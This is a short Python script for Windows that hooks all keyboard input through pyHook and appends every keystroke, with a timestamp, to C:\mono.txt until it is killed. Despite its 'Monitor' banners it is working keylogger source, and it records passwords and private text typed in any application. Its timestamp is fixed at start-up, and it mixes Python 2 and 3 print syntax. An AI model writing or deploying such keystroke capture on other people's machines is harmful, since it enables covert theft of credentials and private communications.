import sys
import socket
import win32com
import pythoncom
import pyHook
import datetime

print("--------------------Monitor will start immediately------------------------")
print("--------------------------------------------------------------------------")
print("-------------------Writes file to C drive called mono.txt-----------------")

__today = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def onKeyboardEvent(event):
    monitor = chr(event.Ascii)
    print "Key: ", chr(event.Ascii)
    monitor = __today + "Key:"+ '\t'+ "[" + monitor +"]" +'\n'

    fil = open("C:\\mono.txt", "a")
    fil.write(monitor)
    fil.close()
    return True #,return x

hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages() #will wait forever